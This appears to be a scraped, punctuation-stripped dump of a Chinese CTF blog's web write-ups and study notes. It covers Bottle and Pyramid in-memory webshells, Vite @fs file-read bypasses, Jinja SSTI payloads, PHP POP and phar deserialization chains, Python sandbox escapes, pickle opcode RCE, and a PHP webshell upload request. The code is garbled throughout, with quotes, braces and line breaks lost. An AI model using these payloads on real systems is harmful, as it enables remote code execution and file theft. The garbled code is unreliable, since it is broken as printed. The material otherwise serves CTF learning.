http://127.0.0.1:6543/api/test?code=+code+token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tburp0_headers = User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8, Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2, Accept-Encoding: gzip, deflate, br, Connection: close, Upgrade-Insecure-Requests: 1, Sec-Fetch-Dest: document, Sec-Fetch-Mode: navigate, Sec-Fetch-Site: none, Sec-Fetch-User: ?1, Priority: u=0, ires=requests.get(burp0_url, headers=burp0_headers)print(res.text) bottle内存马参考文章:https://forum.butian.net/share/4048 这里直接记录几种做法 1.直接绑定路由payload app.route(/b,GET,lambda :__import__(os).popen(request.params.get(a)).read()) #直接访问/b路由 a参数可以进行rce 2.利用报错界面 污染报错界面payload app.error(404)(lambda e: __import__(os).popen(request.query.get(a)).read()) 3.利用add_hookadd_hook就是注册钩子函数 #reaponseapp.add_hook(before_request, lambda: __import__(bottle).response.set_header(X-flag, __import__(base64).b64encode(__import__(os).popen(request.query.get(a)).read().encode(utf-8)).decode(utf-8)))#abortapp.add_hook(before_request, lambda: __import__(bottle).abort(404,__import__(os).popen(request.query.get(a)).read())) 结语学习python内存马先告一段落了 有很多其他模板的内存马 以后遇到了再来补全吧~~~","tags":["CTF学习"]},{"title":"TGCTF2025-WEB WP","path":"/2025/04/14/TGCTF2025-WEB/","content":"AAA偷渡阴平?php ?------WebKitFormBoundaryU4VFMZ4wbU2hEGvgContent-Disposition: form-data; name=submit上传文件------WebKitFormBoundaryU4VFMZ4wbU2hEGvg-- 前端GAME进去是个小游戏 本来以为是正常思路 但是怎么都做不出 于是题目是个vue框架的游戏 于是搜索 发现有关于这个的漏洞 漏洞文章:Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区 Vite存在CVE-2025-30208安全漏洞（附修复方案和演示示例) Vite漏洞原理Vite在开发服务器模式下，提供了@fs功能，原本是为了让开发者访问服务允许范围内的文件。正常情况下，如果请求的文件超出了这个允许范围，Vite应该返回“403 Restricted”，提示访问受限。但攻击者发现了一个“漏洞”，当在请求URL中添加?raw??或?importraw??这样的特殊参数时，就能绕过原本的文件访问限制检查。 原因：Vite在处理请求的多个环节中，会移除类似?的结尾分隔符，但在查询字符串的正则匹配过程中，却没有考虑到这种特殊情况，这就给攻击者可乘之机，他们利用这个缺陷，就能读取目标文件的内容。 题目解法直接按照他给的payload /@fs/tgflagggg?importraw?? 前端GAME Plus上一道题的payload不可行了 文章未公开的poc:可以通过svg来进行文件读取 /@fs/tgflagggg?import?meteorkai.svg?.wasm?init 得到VEdDVEZ7ZmUxM2MzZGYtYzNkNC1hYjJhLTQwZjYtNjNjYjM1MzczNjAyfQo base64解码 TGCTF{fe13c3df-c3d4-ab2a-40f6-63cb35373602} 前端GAME Ultraplus的payload也不可以 /@fs/app#/../proc/self/environ读环境变量 也可以 /@fs/app/vite-project/#/../../../../../tgflagggg 直面天命访问hint 提示是一个四个小写英文字母的路由 爆出来是aazz路由 进去f12 看到说是可以传参数 but不知道参数是什么 那就arjun爆破吧 爆出来是filename 看到fillename参数 一般会考虑到ssrf 就像name是ssti一样 传入?filename=/etc/passwd 可以读取 尝试读取环境变量 ?filename=/proc/1/environ 也可以直接读flag 直面天命（复仇）import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=[lipsum,|,%,,,map,chr, value, get, url, pop,include,popen,os,import,eval,_,system,read,base,globals,_.,set,application,getitem,request, +, init, arg, config, app, self]def waf(name): for x in black_list: if x in name.lower(): return True return Falsedef is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars@app.route(/)def home(): return send_from_directory(static, index.html)@app.route(/jingu, methods=[POST])def greet(): template1= template2= name = request.form.get(name) template = fname if waf(name): template = 想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹Image else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = 连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧再去西行历练历练Image return render_template_string(template) template1 = “六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“”最后，如果你用了cat，就可以见到齐天大圣了 template= template.replace(天命,).replace(难违,) template = template if cat in template: template2 = 或许你这只叫天命人的猴子，真的能做到？Image try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f500报错了，查询语句如下：template return error_message, 400@app.route(/hint, methods=[GET])def hinter(): template=hint：有一个aazz路由，去那里看看吧，天命人! return render_template_string(template)@app.route(/aazz, methods=[GET])def finder(): with open(__file__, r) as f: source_code = f.read() return fsource_code, 200, Content-Type: text/html; charset=utf-8if __name__ == __main__: app.run(host=0.0.0.0, port=80) 审计源码 黑名单 black_list=[lipsum,|,%,,,map,chr, value, get, url, pop,include,popen,os,import,eval,_,system,read,base,globals,_.,set,application,getitem,request, +, init, arg, config, app, self] 把{}ban了 但是天命和难违可以替换为 所以直接按照黑名单 打ssti就可 最后payload 天命((g[pop][\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f][\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f][\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f](os))[popen](cat /t*))[read]()难违 火眼辩魑魅进去dirsearch扫描网站 看到robots.txt 访问得到很多路由 说是只有一个能到 直接到tgshell.php打rce即可 post传入· shell=print \\cat t*`; 因为是一句话木马 也可以直接使用蚁剑连接 然后也可得到flag 什么文件上传？进去是文件上传 发现传什么都被ban 于是dirsearch了一下网站 robots.txt里有东西 [图片] 访问class.php 发现是是反序列化并且有漏洞点 ?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); class yesterday public $learn; public $study=study; public $try; public function __construct() $this-learn = learnbr; public function __destruct() echo You studied hard yesterday.br; return $this-study-hard(); //1 class today public $doing; public $did; public $done; public function __construct() $this-did = What you did makes you outstanding.br; public function __call($arg1, $arg2) $this-done = And what youve done has given you a choice.br; echo $this-done; if(md5(md5($this-doing))==666) return $this-doing(); else return $this-doing-better; //2 class tommoraw public $good; public $bad; public $soso; public function __invoke() $this-good=Youll be good tommoraw!br; echo $this-good; public function __get($arg1) $this-bad=Youll be bad tommoraw!br; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) if ($this-out-useful7) echo Seven is my lucky numberbr; system(whoami); public function __toString() echo This is your future.br; system($_POST[wow]); //3 return win; public function __destruct() $this-no = no; return $this-no; if (file_exists($_GET[filename])) echo Focus on the previous step!br; else $data=substr($_GET[filename],0,-4); unserialize(best64_decode($data)); // You learn yesterday, you choose today, can you get to your future?? 理一下大概的链子顺序 yesterday::destruct（studynew today）- today::__call（doingnew future）- future::__tostring 然后post传入wow就可以进行命令执行 但是有个注意点 function best64_decode($str) return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); ...... unserialize(best64_decode($data)); 序列化后的数据还要base_encode 5次传入 pop链如下 ?php class yesterday public $learn; public $study; public $try; class today public $doing; public $did; public $done; class tommoraw public $good; public $bad; public $soso; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; $aa = new yesterday();$aa-study = new today();$aa-study-doing = new future();echo serialize($aa);? null替换为%00就行了 因为private属性的原因 Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBoa1QxSkhVbkZhVnpBMFpVWlJlV0pGZEd4aVZrcEtWbTB4TUdKR1ZYZGhlazVYVTBoQ01sUldWVFZqUms1eFVXMXNUbUpGY0haWGJGcFBVMnMxY2sxVVdtcFNSMUp4V2xjd05HVkdVWGxpUlhSb1RXdHNOVmxyYUZkWlYxWldZWHBPVjFOSVFqSlVWM00xWTBaT2RFMVhkRmhTYTJ3MFYxUkplRlp0UmxaUFdFWlVWMGhDVVZsdE5WTk9iRkY1WTBWYVQxSlViSGRWTWpCNFlURmtSMU5ZYUZwTmFrWllXVEJrUzFkV1JuVlhiWEJPVFVSV00xWXhZM2hPUjBwR1lraEdhMU5JUWxGWlYzUnlaVVpSZVdKRmRGUldNR3cyVjFSS2ExZHJNWEpYYWtaVVZsZG9lbHBITVZOV1JrWjBUbGRHV0ZKclduVlhWbFpyVmpKV1YyTkdWbEJTUjJoaFdXMTBjbU5zVGxoalJFSnNZWHBzZUZWc2FHOVZSMFpXWTBoU1lWSnRhRlJVVm1SUFpFWmFkVmR0ZEZoU2ExcDNWa2h3UWsxRk5IbFVhbHBwVFRKb1QxVnJZelZqUm1SMFRsWmtUbEl4U2xwVk1qRTBZVmRLVldGSVFsVmxhMFYzVkdwS1QwNXRTalpVYkVKb1ZsYzVORmRZY0V0V01rcFlWV3hvYTAweWFFdFpWelZUVlVaU05sUnJOVTloZWxVeVdXcEtjMkV4WkVaT1dFNVlZbFJXV0ZsNlFYaGpSazVWV2taV2FHSnNTVEpXUkVwM1lXczFjbUpJVmxkaWJrSm9WbXBHZG1WR2JISlZhelZvVmxSb00xUnJVbXRoYlZaMFQwaHdWVTF0ZUV4VVZtUk9aVlphZEUxWGRGZE5NazR6VlRGa2QwMUdVWGRQU0hCVlZrWndVRnBYTURWalJuQkhZVVU1YVZKdVFqRldiVFZQVkRGVmQyRjZUbGRTTTBGM1dsZHpOV05XYkRaWGEzQnBZa1p2TWxZeWVHdFpWVEZZVTJ0V1dGWXllRkZVVlZKU1RURnJlbU5JV2s1TlJHeDNWVEp3UjJGck1YTlhibEpoVW0xUmVsUlVRbk5qVjFKR1QxWkNUazFFUVhsV1J6VjNaRzFHV0ZWc2JGVmlXR2hvV1cxNFlXVnNVWGRVYTNCUFRWWktlRnBGYUhkVlIwWjBWRlJLVkZaNlZsaGFWM2gzVjBaa2NWSnRiRk5TTTFKM1ZraHdRazFGTkhsVWFscHBaV3hLVVZsV1ZuWmxSbXcyVTJ4a2FWWXhTbGxhUkU1dlZHeEZkMkY2VGxkU00wRjNXbGR6TldOV2NEWlhhM0JwWWtadk1sWXllR3RaVlRGWVUydFdVMWRIYUV0WlZ6VlRWVVpTTmxSck5VOWhlbXhHV1dwS2MyRXhaRVpPV0U1WVlsUldXRmw2UVhoV1ZrNVlZa1pDVGxKR1JYcFhWRTUzWkdzMVJrOVlRbFJoYTFweFZGZDRZV1JHY0VkYVJFNXNVbFJGTVZVeFVtdFdWMFoxVldwYVZVMXVRblZVYlhSelpGWmFkV05IUmxkTlZ6azBWMWQwVTFKck1VWmlTRVpyVWxSc1VWUlVRWGROYkZGM1ZXNWFhRll4U2xwV1J6RTBXVmRLYzFkdWNGVldiRXBYV1ZaVk5HUXdOVVZhUjNCc1lsUm5kMVpFU25OVE1ERllWRmhzVjJKVVJuSldhazVyVGtaU2RHSkZjRTlOVmtwNFdrVm9kMVZIUm5SWmVrcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldWalpWTVdSM1RVWlJkMDlJY0ZWV1JuQlJWV3RqTldOR2NFZGhSVGxwVW01Q01WWnROVTlVYkZwSVdraENWV1ZyUlhkVWFrcFBUbTFLTmxWc1FtaFdWemswVjFod1MxWXlTbGhWYkdoclRUSm9VVlpVUW5KTk1WcElZMFJDYkdGNmJIaFhibkJoVTIxS2MxZHFXbGhpUjFKb1ZGWmtTMUpXVGxsYVJYQm9ZbXhLVVZaSWNFNWxSMVp5VDFoR1ZWWkdjRXRaYkZwTFpERmtjbFJyY0U5TlZrcDRXa1ZvZDFWSFJuTlNWRXBVVm5wR1ZGcEhNVXRrUmxwWVlrWkNUbEpHUlhwWGJYaHZWR3MxY2sxVVdtbE5iWGh5VlRCV2RrMVdUbGhqUkVKVlRVUm9ObFJWVVhkUVVUMDk=1111 在传入wowcat flag即可 什么文件上传？(复仇)漏洞利用点:phar协议流可被file_exists()函数直接触发 可以上传.avg文件 链子如下 ?php class yesterday public $learn; public $study; public $try; class today public $doing; public $did; public $done; class tommoraw public $good; public $bad; public $soso; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; $aa = new yesterday();$aa-study = new today();$aa-study-doing = new future();$phar = new Phar(sauy.phar);$phar-startBuffering();$phar-setStub(GIF89a.?php __HALT_COMPILER(); ? );$phar-setMetadata($aa);$phar-addFromString(test.txt, test);$phar-stopBuffering();? php -d phar.readonly=0 -f explore.php 将生成的sauy.php改为atg 上传成功后 到class.php 进行反序列化操作 get传入：?filenamephar:.uploadssauy.atgtest.txt post传入：wowenv 熟悉的配方，熟悉的味道进去即使源代码贴脸 但是可惜我不会 赛后复现算是学到了 谢谢实验室的佬大教我 考点：沙箱绕过 python代码注入 源码 from pyramid.config import Configuratorfrom pyramid.request import Requestfrom pyramid.response import Responsefrom pyramid.view import view_configfrom wsgiref.simple_server import make_serverfrom pyramid.events import NewResponseimport refrom jinja2 import Environment, BaseLoadereval_globals = #防止eval执行恶意代码 __builtins__: , # 禁用所有内置函数 __import__: None # 禁止动态导入def checkExpr(expr_input): expr = re.split(r[-+*/], expr_input) print(exec(expr_input)) if len(expr) != 2: return 0 try: int(expr[0]) int(expr[1]) except: return 0 return 1def home_view(request): expr_input = result = if request.method == POST: expr_input = request.POST[expr] if checkExpr(expr_input): try: result = eval(expr_input, eval_globals) except Exception as e: result = e else: result = 爬！ template_str = 【xxx】 env = Environment(loader=BaseLoader()) template = env.from_string(template_str) rendered = template.render(expr_input=expr_input, result=result) return Response(rendered)if __name__ == __main__: with Configurator() as config: config.add_route(home_view, /) config.add_view(home_view, route_name=home_view) app = config.make_wsgi_app() server = make_server(0.0.0.0, 9040, app) server.serve_forever() 法1：用抛出错误实现RCE，用污染HTTP 500的返回消息实现回显脚本看不懂问ai import requestsurl = your_urlcode = fb = re.match.__globals__[__builtins__]b[setattr](b[__import__](wsgiref).handlers.BaseHandler,error_body,b[__import__](os).popen(ls /).read().encode())raise Exception(1)resp = requests.post(url, data = expr: fexec(code!r),)print(resp.status_code)print(resp.text) 脚本解释首先通过 b = re.match.__globals__[__builtins__] 这一步是通过加载__globals__的属性访问全局空间 目的是绕过对__import__和__builtins__的限制 相当于绕过对这个的沙箱限制然后 b[setattr](b[__import__](wsgiref).handlers.BaseHandler,error_body 是过__import__函数动态加载wsgiref模块wsgiref.handlers.BaseHandler是WSGI处理HTTP请求/响应的基类，负责生成错误响应内容。b[__import__](os).popen(ls /).read().encode() 然后修改类的error_body属性为命令执行的内容 然后encode是把其转化为字节类型raise Exception(1)是强制抛出异常 触发WSGI报错 原理通过故意触发程序中的异常（错误），利用异常处理机制中的漏洞执行恶意代码。例如，在动态代码执行环境（如eval）中，攻击者构造输入引发异常，同时注入恶意代码。 做题思考步骤： 输入构造：提交包含恶意代码的输入，如1 + a引发类型错误。 异常触发：服务器处理输入时抛出异常，进入错误处理流程。 代码注入：在异常处理过程中，恶意代码被解析执行。例如，通过__import__(os).system(ls)执行系统命令。 绕过限制：利用反射或内置对象（如__builtins__）绕过沙箱限制，实现任意代码执行。 法2：布尔盲注import stringimport requestsfrom tqdm import tqdmurl = flag=for i in range(len(flag),50): # for s in TGCTF: for s in tqdm(-+++string.ascii_lowercase+string.digits): data = expr:fimport os,operator;f=os.popen(cat /f*).read();a=int(operator.eq(f[i],s));1/a # res = requests.post(url, data=json) res = requests.post(url, data=data) # print(res.text, s) if res.text != A server error occurred. Please contact the administrator.: flag += s print(flag) break print(i)s 法3：pyramid内存马推荐这篇师傅的文章捏 https://www.yuque.com/polestar-mzvgl/swtget/zuh78rfp7i67u219#AWd8j 也可以看我的博客内置文章 https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/ TG_wordpress有很多漏洞点 治理只写一种 扫描二维码下下来一个apk文件 jadx反编译后 全局搜索 password string name=web04+ username/password:/stringstring name=web05+ TG_wordpressor/stringstring name=web06+ aXx^oV@Kamp;cFoVaztQ*/string 在login路由登录 进入过后 查询插件确定cve 的型号(你可也直接复制插件的内容 然后直接问dp) TGCTF{CVE-2020-25213} TGCTF 2025 后台管理SQL注入","tags":["CTF-wp"]},{"title":"pickle反序列化学习","path":"/2025/04/10/pickle反序列化/","content":"前置知识详细前置知识可以看官方文档https://docs.python.org/zh-cn/3/library/pickle.html Pickle–Python对象反序列化Picklepickle是python里一个可以对一个 Python 对象结构的二进制序列化和反序列化的模块。pickling 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 unpickling 是相反的操作pickel可以看作一种独立的栈语言，其对opcode的编写可以进行python代码执行、变量覆盖等操作。 pickle序列化和反序列化对象 – 二进制字节流 import pickle class Person(): def __init__(self): self.age=18 self.name=A p=Person()opcode=pickle.dumps(p)print(opcode) P=pickle.loads(opcode)print(The age is:+str(P.age),The name is:+P.name) //P.age 是调用age成员 P.name 是调用name成员 pickle.dumps将对象序列化为二进制字节流 pickle.loads将二进制字节流化为对象 Pickle反序列化漏洞成因:就是在二进制字节流上做手脚 就像php反序列化我们传入序列化后的字符串来达到我们想要的目标 import pickleimport os class Person(): def __init__(self): self.age=18 self.name=A def __reduce__(self): command=rwhoami return (os.system,(command,)) p=Person()opcode=pickle.dumps(p)print(opcode) P=pickle.loads(opcode)print(The age is:+str(P.age),The name is:+P.name) 特殊函数__reduce__ return 一个元组 第一个是可调用对象 第二个是一个参数元组 在pickle.loads的时候就会执行os.system(“whoami”) 那就成功执行任意python代码了 Pickle工作原理独立的栈语言，由一串串opcode组成。语言解析依靠Pickle Virtual Machine(PVM)进行。 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。 stack：由 Python 的 list 实现，被用来临时存储数据、参数以及对象。 memo：由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。 常用opcode指令 指令 描述 具体写法 栈上的变化 c 获取一个全局对象或import一个模块 c[module] [instance] 获得的对象入栈 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module] [callable] 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 N 实例化一个None N 获得的对象入栈 S 实例化一个字符串对象 S’xxx’ （也可以使用双引号、等python字符串形式） 获得的对象入栈 V 实例化一个UNICODE字符串对象 Vxxx 获得的对象入栈 I 实例化一个int对象 Ixxx 获得的对象入栈 F 实例化一个float对象 Fx.x 获得的对象入栈 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 ) 向栈中直接压入一个空元组 ) 空元组入栈 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 ] 向栈中直接压入一个空列表 ] 空列表入栈 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 } 向栈中直接压入一个空字典 } 空字典入栈 p 将栈顶对象储存至memo_n pn 无 g 将memo_n的对象压栈 gn 对象被压栈 0 丢弃栈顶对象 0 栈顶对象被丢弃 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 import pickle opcode=bcossystem(SwhoamitR.pickle.loads(opcode) 运行以上代码就会执行whoami命令 pickletools用这个模块可以把opcode转换成我们易读的形式 import pickletoolsopcode = bcossystem(SwhoamitR.pickletools.dis(opcode) 得 0: c GLOBAL os system 11: ( MARK 12: S STRING whoami 22: t TUPLE (MARK at 11) 23: R REDUCE 24: . STOPhighest protocol among opcodes = 0 Opcode漏洞利用命令执行opcode可以执行多个命令，可以通过手写的方式来达到。 opcode中，**.**是程序结束的标志，我们可以通过去掉.将两个字节流拼接在一起。 import pickle opcode=bcossystem(SwhoamitRcossystem(SwhoamitR.pickle.loads(opcode)#就会执行两次whoami命令 注意！部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为os.system()，在部分Linux下则为posix.system()。所以有时候linux和win下的脚本运行结果是不同的。 R i o 这是三个执行函数的字节码 R opcode1=bcossystem(SwhoamitR. i opcode2=b(Swhoamiiossystem. o opcode3=b(cossystemSwhoamio. 变量覆盖在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。所以pickle可以进行session伪造，来变量覆盖。 实验: #test.pyimport pickleimport secretprint(secret变量的值为: + secret.secret)opcode = bc__main__secret(SsecretSHack!!!db.fake = pickle.loads(opcode)print(secret变量的值为: + fake.secret) #secret.pysecret = This is a key 这样就可以成功覆盖原来的secret pickle暂时先学到这里吧笔者觉得学再多的理论还是得应用，如果以后有什么新的东西就再来补坑🤭","tags":["CTF学习"]},{"title":"蜀道山2024wp","path":"/2025/04/10/蜀道山2024-wp/","content":"奶龙牌WAF拿到附件 不准上传后缀为ph和hta的文件 并且对文件大小有限制 代码关键处: move_uploaded_file 函数定义和用法：move_uploaded_file() 函数把上传的文件移动到新位置。如果成功该函数返回 TRUE，如果失败则返回 FALSE。 语法：move_uploaded_file(file,newloc)file:必需。规定要移动的文件。newloc:必需。规定文件的新位置。 提示注释：该函数仅用于通过 HTTP POST 上传的文件。注释：如果目标文件已经存在，将会被覆盖。 题目做法:当move_uploaded_file函数参数可控时，可以尝试/.绕过，因为该函数会忽略掉文件末尾的/.，所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 这段代码代表只对前5000字节进行校验，意思是5000之后我们就可以传入危险内容(木马)。 使用print(a*2000000+?php eval($_POST[1]);?) 上传文件即可 数据包构造 POST /?name=1.php/. HTTP/1.1Host: gz.imxbt.cn:20801Content-Length: 1048752Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Origin: http://gz.imxbt.cn:20801Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycXLzLLazg0AJNoVAAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://gz.imxbt.cn:20801/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7Cookie: PHPSESSID=8177754fd454ad57569dea76792994c9; name=!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu; GZCTF_Token=CfDJ8MKySZ_mlO1BrUTiopFb3pr4sMLMFDp7VLwqIHHQ787J8MU9o7kzKDQgSGH3aUSAFreJelz-xjNcVon1NvCY9iAKz8ktIq-qB4r2jQSniDqdjks-AlNc7Rkw9ROQ3vAa9e0N-iumHmUWe1UcvM30oD4C_p5X2rfkyF4zaLlPcJte51OO6suesKAsKpiTzQ1RvmbX-oqD9hVQaRz0jBi9xFJ7fpCIh2-_Y8UzrQ8TgMQRwpHxaUjX6TUPWl2iaCoFCXNG5RSUU5JVX6JeXurix40S_LdkKSdgdmEXKkw1XNLb5v1YDumTpaGciQGUIVoxHZRwlEtgQ5eR3pq8O1_vm4yODQYq4Y0RPvc2MoJVYLZgX1u-EsroGJdBXAMr09bPEkPJYYerhs1QlP5t2Y8A076GE8Cv82ugOHeNStUNFBf_XQwunbSKJt0FaUtv0SdEu-EKn79ZcAd4m_Ui2-DypcJ6NW7yQrVoC31ElAZuLxFCuVZP4Jw_hZxvAhETL4Pm3Jbx0XR1Dv_Eyjirco1Gtowu44qH972w0qN2sbR2iTwatubxFs39PNNj6dBeZj3MsqihIS5JgY4aY2yAiSLgV586D0zNxFepVQR6_qSzYVX61OIiXKjnRACYg6F6neFGC7YwlYz260chM2RECVTWEqQOdR02WQ6HRcoMqFiFMMXchvAX7rW8t3RJ7T6dF_eel5le5oHsYhoxevoMfddEVM8Connection: close------WebKitFormBoundarycXLzLLazg0AJNoVAContent-Disposition: form-data; name=upload_file; filename=1.php/.Content-Type: image/jpeg2000000个a+?php eval($_POST[1]);?------WebKitFormBoundarycXLzLLazg0AJNoVA-- 上传连接蚁剑 恶意代码检测器进去就是个检测器 扫描路径发现www.zip 下载得到源码 index.php里有检测code的源码 ?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController public function index() $code = preg_replace(/[\\;%\\\\\\\\]/, , $_POST[code]); if(preg_match(/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\\~|\\`|\\#|\\%|\\^|\\|\\*|\\-|\\+|\\[|\\]|\\_|\\|\\|\\/|\\?|\\\\\\\\/is, $code)) $attack_log_file = /tmp/attack.log; if(file_exists($attack_log_file)) file_put_contents($attack_log_file, $attack_word=\\.$code.\\;.\\r ,FILE_APPEND); require_once(/tmp/attack.log); else file_put_contents($attack_log_file, .?.php.\\r ); if(isset($attack_word)) echo 检测到危险代码: .$attack_word.！！！; else echo 欢迎使用gxngxngxn的恶意代码检测器！！！; else $safe_log_file = /tmp/safe.log; if(file_exists($safe_log_file)) file_put_contents($safe_log_file, $safe_word=.$code.;.\\r ,FILE_APPEND); require_once(/tmp/safe.log); else 